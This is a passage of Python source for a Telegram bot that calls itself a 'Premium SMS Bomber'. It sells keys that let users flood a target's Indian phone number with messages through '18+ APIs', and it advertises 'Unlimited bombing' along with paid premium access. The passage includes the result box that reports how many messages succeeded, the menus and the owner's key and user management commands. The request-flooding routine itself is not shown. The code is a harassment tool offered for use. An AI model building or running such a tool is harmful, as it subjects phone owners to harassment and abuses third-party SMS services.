        f"│ 📞 Target: +91{phone}        │\n"
        f"│ 👑 Type: {'⭐ PREMIUM ⭐' if is_premium else '🔓 STANDARD'}      │\n"
        f"│ 📨 Total: {max_apis}             │\n"
        f"│ ✅ Success: {success_count}             │\n"
        f"│ ❌ Failed: {failed_count}              │\n"
        f"├─────────────────────────┤\n"
    )
    
    if successful_services:
        services = ', '.join(successful_services[:8])
        result_text += f"│ 🟢 {services} │\n"
    
    result_text += (
        f"└─────────────────────────┘\n\n"
        f"💀 @BeStChEaT_OwNeR"
    )
    
    await msg.edit_text(result_text)

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if query.data == "send_number":
        await query.edit_message_text(
            "📞 SEND NUMBER\n\n"
            "Please send your 10-digit number.\n"
            "Example: 9876543210\n\n"
            "⚡ Make sure:\n"
            "✅ You have a valid key\n"
            "✅ Number is 10 digits\n"
            "✅ No spaces or symbols\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    
    elif query.data == "get_key":
        await query.edit_message_text(
            "🔑 GET KEY\n\n"
            "📌 How to get a key:\n\n"
            "1️⃣ Contact @BeStChEaT_OwNeR\n"
            "2️⃣ Get your unique key\n"
            "3️⃣ Use /key YOUR_KEY to activate\n\n"
            "💰 Pricing:\n"
            "• Standard: 1 week - Free\n"
            "• Premium: 1 month - Paid\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    
    elif query.data == "premium_info":
        keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "👑 PREMIUM ACCESS 👑\n\n"
            "⚡ Premium Features:\n"
            "✅ All 18+ APIs\n"
            "✅ Unlimited bombing\n"
            "✅ Priority support\n"
            "✅ No usage limits\n"
            "✅ 24/7 access\n\n"
            "🔑 Get Premium Key:\n"
            "Contact @BeStChEaT_OwNeR\n\n"
            "💰 Price: Contact for pricing\n\n"
            "💀 @BeStChEaT_OwNeR",
            reply_markup=reply_markup
        )
    
    elif query.data == "about":
        keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "ℹ️ ABOUT THIS BOT\n\n"
            "🤖 Name: SMS Bomber Bot\n"
            "👨‍💻 Creator: @BeStChEaT_OwNeR\n"
            "🔧 Version: 4.0 Premium\n"
            "📊 APIs: 18+ Platforms\n"
            "⚡ Speed: Ultra Fast\n\n"
            "📌 Features:\n"
            "• Premium Key System\n"
            "• 18+ Working APIs\n"
            "• Real-time Progress Box\n"
            "• Smart Management\n"
            "• Premium & Normal Users\n\n"
            "💀 @BeStChEaT_OwNeR",
            reply_markup=reply_markup
        )
    
    elif query.data == "commands":
        await commands_list(update, context)
    
    elif query.data == "back":
        await start(update, context)

# --- Owner Commands (Short & Easy) ---

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Create normal key"""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /create <days> <max_uses>")
        return
    
    try:
        days = int(args[0])
        max_uses = int(args[1])
        key = create_key(days, max_uses, False)
        await update.message.reply_text(
            f"✅ Key Created!\n\n"
            f"🔑 Key: {key}\n"
            f"📅 Days: {days}\n"
            f"📊 Uses: {max_uses}\n"
            f"👑 Type: STANDARD"
        )
    except:
        await update.message.reply_text("❌ Invalid input!")

async def createpremium_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Create premium key"""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /createpremium <days> <max_uses>")
        return
    
    try:
        days = int(args[0])
        max_uses = int(args[1])
        key = create_key(days, max_uses, True)
        await update.message.reply_text(
            f"✅ Premium Key Created! ⭐\n\n"
            f"🔑 Key: {key}\n"
            f"📅 Days: {days}\n"
            f"📊 Uses: {max_uses}\n"
            f"👑 Type: PREMIUM"
        )
    except:
        await update.message.reply_text("❌ Invalid input!")

async def list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all keys"""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    db = load_db()
    if not db['keys']:
        await update.message.reply_text("📭 No keys found!")
        return
    
    text = "🔑 All Keys\n\n"
    for key, data in db['keys'].items():
        status = "✅" if data['active'] else "❌"
        premium = "⭐" if data.get('is_premium', False) else "🔓"
        expiry = datetime.fromisoformat(data['expiry']).strftime('%Y-%m-%d')
        text += f"{status} {premium} {key} - {data['used']}/{data['max_uses']} - {expiry}\n"
    
    await update.message.reply_text(text)

async def block_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Block a key"""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /block KEY")
        return
    
    key = args[0].upper().strip()
    if block_key(key):
        await update.message.reply_text(f"✅ Key {key} blocked!")
    else:
        await update.message.reply_text(f"❌ Key {key} not found!")

async def unblock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unblock a key"""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /unblock KEY")
        return
    
    key = args[0].upper().strip()
    if unblock_key(key):
        await update.message.reply_text(f"✅ Key {key} unblocked!")
    else:
        await update.message.reply_text(f"❌ Key {key} not found!")

async def delete_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Delete a key"""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /delete KEY")
        return
    
    key = args[0].upper().strip()
    if delete_key(key):
        await update.message.reply_text(f"✅ Key {key} deleted!")
    else:
        await update.message.reply_text(f"❌ Key {key} not found!")

async def blockuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Block a user"""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /blockuser USER_ID")
        return
    
    try:
        uid = int(args[0])
        if block_user(uid):
            await update.message.reply_text(f"✅ User {uid} blocked!")
        else:
            await update.message.reply_text(f"❌ User already blocked!")
    except:
        await update.message.reply_text("❌ Invalid user_id!")

async def unblockuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unblock a user"""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /unblockuser USER_ID")
        return
    
    try:
        uid = int(args[0])
        if unblock_user(uid):
            await update.message.reply_text(f"✅ User {uid} unblocked!")
        else:
            await update.message.reply_text(f"❌ User not found in block list!")
    except:
        await update.message.reply_text("❌ Invalid user_id!")

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all users"""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    db = load_db()
    if not db['users']:
        await update.message.reply_text("📭 No users found!")
        return
    
    text = "👥 All Users\n\n"
    for uid, data in db['users'].items():
        text += f"• {uid} - {data['used_count']} uses\n"
    
    await update.message.reply_text(text)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bot statistics"""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    db = load_db()
    total_users = len(db['users'])
    total_keys = len(db['keys'])
    active_keys = sum(1 for k in db['keys'].values() if k['active'])
    blocked_users = len(db['blocked'])
    premium_keys = sum(1 for k in db['keys'].values() if k.get('is_premium', False))
    
    await update.message.reply_text(
        f"📊 BOT STATISTICS\n\n"
        f"👥 Users: {total_users}\n"
        f"🔑 Total Keys: {total_keys}\n"
        f"✅ Active Keys: {active_keys}\n"
        f"⭐ Premium Keys: {premium_keys}\n"
        f"🚫 Blocked Users: {blocked_users}\n\n"
        f"💀 @BeStChEaT_OwNeR"
    )

# --- Main Bot ---

def main():
    if not BOT_TOKEN or BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
        print("❌ Error: BOT_TOKEN not set!")
        return
    
    print("🤖 Starting Premium SMS Bomber Bot...")
    print(f"👤 Owner ID: {OWNER_ID}")
    print(f"🤖 Bot: {BOT_USERNAME}")
    print("🚀 Bot is running!")
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # User Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("key", key_command))
    app.add_handler(CommandHandler("commands", commands_list))
    app.add_handler(CommandHandler("status", status_command))
    
    # Owner Commands (Short & Easy)
    app.add_handler(CommandHandler("create", create_command))
    app.add_handler(CommandHandler("createpremium", createpremium_command))
    app.add_handler(CommandHandler("list", list_command))
    app.add_handler(CommandHandler("block", block_command))
    app.add_handler(CommandHandler("unblock", unblock_command))
    app.add_handler(CommandHandler("delete", delete_command))
    app.add_handler(CommandHandler("blockuser", blockuser_command))
    app.add_handler(CommandHandler("unblockuser", unblockuser_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CommandHandler("stats", stats_command))
    
    # Message Handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    app.run_polling()

if __name__ == '__main__':
    main()
